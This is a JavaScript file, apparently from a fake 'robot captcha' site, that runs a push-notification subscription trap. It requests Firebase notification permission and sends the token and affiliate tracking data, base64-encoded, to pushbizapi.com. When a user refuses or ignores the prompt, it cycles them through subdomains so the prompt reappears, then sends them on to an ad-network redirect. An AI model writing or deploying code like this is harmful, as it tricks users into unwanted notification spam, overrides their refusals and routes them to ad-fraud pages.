var mainDomain = 'robotcaptcha2.info';
var redirectUrl = 'https://blatwalm.com/afu.php?zoneid=2480991';

var subDomains = [
	'a',
	'b',
	'c',
	'd',
	'e',
	'f',
	'g',
	'h',
	'i'
];

var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
var subDomain = window.location.hostname.split('.')[0];
var subDomainIndex = subDomains.indexOf(subDomain);
var lastDomain = false;

if (subDomainIndex >= subDomains.length - 1) lastDomain = true;

!firebase.apps.length ? firebase.initializeApp(config) : firebase.app();

var messaging = firebase.messaging();

var params = {};
initParams();

messaging.requestPermission()
    .then(function () {
        return messaging.getToken();
    })
    .then(function (currentToken) {
        if (currentToken) {
            return sendTokenToServer(currentToken);
        }
    })
    .then(function (response) {
		if(response) {
			window.location.href = redirectUrl;
		}
    }, function (reason) {
		setTokenSentToServer(false);

		var protocol = window.location.protocol;
		var pathName = window.location.pathname;
		var getParams = window.location.search;

		if (reason.code === 'messaging/permission-default' && !isFirefox) {

			if (subDomainIndex == -1) {
				window.location.href = protocol + '//' + mainDomain + pathName + getParams;
			} else if(lastDomain) {
				window.location.href = redirectUrl;
			} else {
				window.location.href = protocol + '//' + subDomains[subDomainIndex] + '.' + mainDomain + pathName + getParams;
			}

		} else if (reason.code === 'messaging/permission-blocked' || (reason.code === 'messaging/permission-default' && isFirefox)) {

			if(lastDomain) {
				window.location.href = redirectUrl;
			} else {
				window.location.href = protocol + '//' + subDomains[subDomainIndex + 1] + '.' + mainDomain + pathName + getParams;
			}

		}
    }).catch(function (err) {
        //debugger;
        setTokenSentToServer(false);
        closePopup();
    });

function sendTokenToServer(currentToken) {
    return new Promise(function (resolve, reject) {
        if (!isTokenSentToServer(currentToken)) {
            var clientData = params;
            //var spinner = document.getElementById("js-spinner");
            //spinner.style.display = "inline-block";

            clientData.token = currentToken;
            clientData.messageSenderId = config.messagingSenderId;
			clientData.clickId = params.c;
			clientData.affiliateId = params.a;
			clientData.subscribeMethod = "robot3";
			clientData.vertical = "buyout";

            sendSubscriptionInfoToServer(clientData)
                .then(function (response) {
                    //debugger;
                    setTokenSentToServer(currentToken);
                    resolve(true);
                })
                .catch(function (err) {
                    reject(false);
                });
        }
        else {
            resolve(true);
        }
    });
}

function isTokenSentToServer(currentToken) {
    return window.localStorage.getItem('sentFirebaseMessagingToken') == currentToken;
}

function sendSubscriptionInfoToServer(subscriptionData) {

    return new Promise(function (resolve, reject) {
        //debugger;
        var domain = 'https://pushbizapi.com';

        var stringifiedObject = JSON.stringify(subscriptionData);

        var base64object = btoa(stringifiedObject);

        var url = domain + '/api2/subscribeGet?data=' + base64object;

        var xhr = createCORSRequest('GET', url);
        if (!xhr) {
            reject("XHR not supported");
        }

        xhr.open("GET", url, true);

        xhr.onload = function () {
            resolve(xhr.responseText);
        };

        xhr.onerror = function () {
            console.log('Error on subscription request');
            reject("Error during sending request");
        };

        xhr.send();
    });
}

function createCORSRequest(method, url) {
    var xhr = new XMLHttpRequest();

    if ("withCredentials" in xhr) {
        xhr.open(method, url, true);
    } else if (typeof XDomainRequest != "undefined") {
        xhr = new XDomainRequest();
        xhr.open(method, url);
    } else {
        xhr = null;
    }
    return xhr;
}

function setTokenSentToServer(currentToken) {
    window.localStorage.setItem('sentFirebaseMessagingToken', currentToken ? currentToken : false);
}

function closePopup() {
	if (window.self) {
		setTimeout(function () {
			window.self.close();
		}, 200);
	}
}

function initParams() {
	var parsedUrl = parseURL(window.location);
    if (parsedUrl.params) {
        params = parsedUrl.params;
    }
}

function parseURL(url) {
	var a =  document.createElement('a');
	a.href = url;
	return {
		host: a.hostname,
        source: url,
		params: (function(){
			var ret = {},
				seg = a.search.replace(/^\?/,'').split('&'),
				len = seg.length, i = 0, s;
			for (;i<len;i++) {
				if (!seg[i]) { continue; }
				s = seg[i].split('=');
				ret[s[0]] = decodeURIComponent(s[1].replace(/\+/g, ' '));
			}
			return ret;
		})()
	};
}

messaging.onTokenRefresh(function () {
    messaging.getToken().then(function (refreshedToken) {
        setTokenSentToServer(false);

        sendTokenToServer(refreshedToken);
    }).catch(function (err) {
        console.log('Unable to retrieve refreshed token ', err);
    });
});
